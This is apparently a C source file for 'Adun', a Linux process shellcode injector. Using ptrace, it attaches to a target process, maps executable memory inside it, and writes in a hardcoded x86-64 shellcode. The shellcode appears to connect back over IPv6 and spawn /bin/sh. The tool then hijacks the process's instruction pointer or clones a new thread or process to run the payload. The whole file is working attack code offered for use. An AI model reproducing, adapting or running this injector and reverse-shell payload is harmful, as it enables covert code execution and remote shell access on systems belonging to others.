
#define _GNU_SOURCE

#include <unistd.h> 
#include <errno.h>
#include <stdio.h>
#include <sched.h> 
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include "utils.h"

#define SHELL_LEN 113 
char *shellcode = "\x6a\x0a\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x29\x58\x0f\x05\x50\x5b\x52\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x01\x51\xb9\x00\x00\x00\x00\x51\xba\xff\xff\x05\xc0\x66\x21\xfa\x52\x48\x31\xf6\x56\x6a\x03\x54\x5f\x6a\x23\x58\x0f\x05\x59\x59\x53\x5f\x54\x5e\x6a\x1c\x5a\x6a\x2a\x58\x0f\x05\x48\x85\xc0\x75\xe0\x48\x96\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x31\xd2\x54\x5f\x6a\x3b\x58\x0f\x05";


#define FLAGS_PROCESS 	(1<<0)
#define FLAGS_DIRECT 	(1<<1)

void usage(const char *name)
{
	
	fprintf(stderr, "\tUsage: %s PID [-p -d]\n", name);
	exit(0);
}


int poke_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	char *ptr = malloc(blen + blen % sizeof(size_t));	// word align
	memcpy(ptr, buf, blen);

	for (i = 0; i < blen; i += sizeof(size_t)) 
	{
		if (ptrace(PTRACE_POKETEXT, pid, addr + i, *(size_t *)&ptr[i]) < 0)
		{
			logs(LOG_ERROR, "%s: %s", "ptrace POKE", strerror(errno));
			exit(1);
		}
	}
	free(ptr);
	return 0;
}



int peek_text(pid_t pid, size_t addr, char *buf, size_t blen)
{
	int i = 0;
	size_t word = 0;
	for (i = 0; i < blen; i += sizeof(size_t)) 
	{
		word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL);
		memcpy(&buf[i], &word, sizeof(word));
	}
	return 0;
}


// TODO change this to search only exec pages of memory

size_t find_syscall_addr(pid_t pid, size_t addr)
{
	// assume that this will not fail
	// searching for syscall after 1kb we give up
	
	int buf_size = 1024;
	void *tmp_ptr;

	char *syscall_op = "\x0f\x05"; 
	char *buf = malloc(buf_size);
	addr -= buf_size;
	peek_text(pid, addr, buf, buf_size);
	tmp_ptr = buf;

	while(memcmp(tmp_ptr, syscall_op, 2))
	{
		tmp_ptr++;
		//printf("addr:%lx\n", addr -((size_t)buf- (size_t)tmp_ptr) );
		if (buf_size-- == 0)
		{
			free(buf);
			return (size_t) NULL;
		}
	}
	free(buf);
	return addr - ((size_t)buf- (size_t)tmp_ptr) ; //addr + offset to syscall
}


/*
void run_shellcode(pid_t pid, void *shellcode, size_t len)
{
	struct user_regs_struct regs, return_regs;
	
	// get rip, save regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		perror("ptrace get regs");
		exit(1);
	}


	peek_text(pid, regs.rip, saved_text, syscall_len);

	// restore regs

}
*/

void remote_jmp(pid_t pid, void *addr)
{
	
	struct user_regs_struct regs;
	
	
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}
	
	regs.rip = (uint64_t) addr;

	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
}

uint64_t remote_syscall(pid_t pid, uint64_t rax, uint64_t rdi, uint64_t rsi, uint64_t rdx, uint64_t r10, uint64_t r8, uint64_t r9)
{
	
	struct user_regs_struct regs, return_regs;

	bool substitute = false;	
	
	char saved_text[2];
   	char *syscall_opt = "\x0f\x05";
	int syscall_len = 2;


	// save	orginal regs
	if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}

	// prepare regs for call
	memcpy(&return_regs, &regs, sizeof(struct user_regs_struct));
	return_regs.rax = rax;
	return_regs.rdi = rdi;
	return_regs.rsi = rsi;
	return_regs.rdx = rdx;
	return_regs.r10 = r10;
	return_regs.r8 = r8;
	return_regs.r9 = r9;
	
	void *ret =  (void *) find_syscall_addr(pid, return_regs.rip);
	if (ret == NULL)
	{
		logs(LOG_WARNING, "cant find any syscall, using substitution method");
		
		peek_text(pid, regs.rip, saved_text, syscall_len);
		substitute = true; 
	}
	else
	{
		return_regs.rip = (uint64_t) ret;
	}


	// load syscall
	if (ptrace(PTRACE_SETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	if (substitute){ poke_text(pid, regs.rip, syscall_opt, syscall_len); }

	// exec
	if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SINGLESTEP", strerror(errno));
		exit(1);
	}
	waitpid(pid, NULL, 0);
	
	
	// get return val
	if (ptrace(PTRACE_GETREGS, pid, NULL, &return_regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace GETREGS", strerror(errno));
		exit(1);
	}


	// restore orginal
	if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace SETREGS", strerror(errno));
		exit(1);
	}
	if (substitute){ poke_text(pid, regs.rip, saved_text, syscall_len); }

	return return_regs.rax;
}

// some remote syscalls prototypes

void *remote_mmap(pid_t pid, void *addr, size_t len, int prot, int flags, int fd, off_t offset)
{
	return (void *) remote_syscall(pid, SYS_mmap, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t)flags, (uint64_t) fd, (uint64_t) offset);
}

void *remote_mprotect(pid_t pid, void *addr, size_t len, int prot)
{
	return (void *) remote_syscall(pid, SYS_mprotect, (uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t) NULL, (uint64_t) NULL, (uint64_t) NULL);
}

int  remote_write(pid_t pid, int fd, const void *buf, size_t count)
{
	return (int) remote_syscall(pid, SYS_write, (uint64_t) fd, (uint64_t) buf, (uint64_t) count, (uint64_t) NULL,(uint64_t) NULL, (uint64_t) NULL);
}

uint64_t remote_clone(pid_t pid, int flags, void *child_stack)
{
	return remote_syscall(pid, SYS_clone, (uint64_t)flags, (uint64_t)child_stack, (uint64_t) NULL, (uint64_t) NULL,(uint64_t) NULL,(uint64_t) NULL);
}


int main(int argc, char *argv[])
{

	pid_t pid;
   	int wstatus, opt, flags=0;
	struct user_regs_struct regs;
	bool main_arg = false;
	
	
	fprintf(stderr, "\n\033[96m\t***************************************\n\t*  Adun - process shellcode injector  *\n\t***************************************\n\n\033[0m");
	
	// parse
	while ((opt = getopt(argc, argv, "pd")) != -1) 
	{
		switch(opt)
		{
			case 'p':
				flags |= FLAGS_PROCESS;
				break;
			case 'd':
				flags |= FLAGS_DIRECT;
				break;	
			default:
				usage(argv[0]);
		}
	}
	
	for(int i=0;i<argc;i++)
	{

		if( argv[i][0] != '-')
		{
			if ((pid = (pid_t)atoi(argv[i])) != 0) 
			{
				break;
			}
		}
		if (i==(argc))
		{
			usage(argv[0]);
		}
	}
	// 					if these 2 bits are set
	if ((pid == 0) || ( (flags & FLAGS_PROCESS) && (flags & FLAGS_DIRECT)))
	{
		usage(argv[0]);
	}


	// main functionality

	logs(LOG_DEGBUG, "attaching to proccess ( id: %d )", pid);
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
	{
		logs(LOG_ERROR, "%s: %s", "ptrace", strerror(errno));
		exit(1);
	}
	waitpid(pid, &wstatus, 0);

	logs(LOG_DEGBUG, "allocating memory");
	void *mem_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);	
	void *stack_addr = remote_mmap(pid, NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);	
	void *stack_top = stack_addr + 4096;
	pid_t ret_pid;

	logs(LOG_DEGBUG, "copying shellcode ( %d bytes )", SHELL_LEN);
	poke_text(pid, (size_t) mem_addr, shellcode, SHELL_LEN);	
	
	logs(LOG_DEGBUG, "setting memory permissions");
	remote_mprotect(pid, mem_addr, 4096, PROT_EXEC);
	
	if(flags & FLAGS_DIRECT)
	{
		// direct shellcode execution
		logs(LOG_DEGBUG, "redirecting execution flow to shellcode");
		remote_jmp(pid, mem_addr);
		
		logs(LOG_DEGBUG, "detaching");
		if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
			logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
			exit(1);
		}

		logs(LOG_DEGBUG, "done");
		return 0;
	}

	// else prepare stack to spawn process/thread
	logs(LOG_DEGBUG, "setting up child's stack");
	poke_text(pid, (size_t) stack_addr, (char *)&mem_addr, sizeof(void *));	

	if(flags & FLAGS_PROCESS)
	{
		// spawn new process
		logs(LOG_DEGBUG, "starting new process");
		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_VM, stack_top);
	}
	else
	{
		// spawn new thread
		logs(LOG_DEGBUG, "starting new thread");
		ret_pid = remote_clone(pid, CLONE_PTRACE | CLONE_SIGHAND | CLONE_THREAD | CLONE_VM | CLONE_FS | CLONE_FILES, stack_top);
	}

	logs(LOG_DEGBUG, "running shellcode");
	remote_jmp(ret_pid, mem_addr);
	
	logs(LOG_DEGBUG, "detaching");
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0){
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
		exit(1);
	}
	
	if (ptrace(PTRACE_DETACH, ret_pid, NULL, NULL) < 0){
		logs(LOG_ERROR, "%s: %s", "ptrace DETACH", strerror(errno));
		exit(1);
	}
	

	logs(LOG_DEGBUG, "done");

	return 0;
}
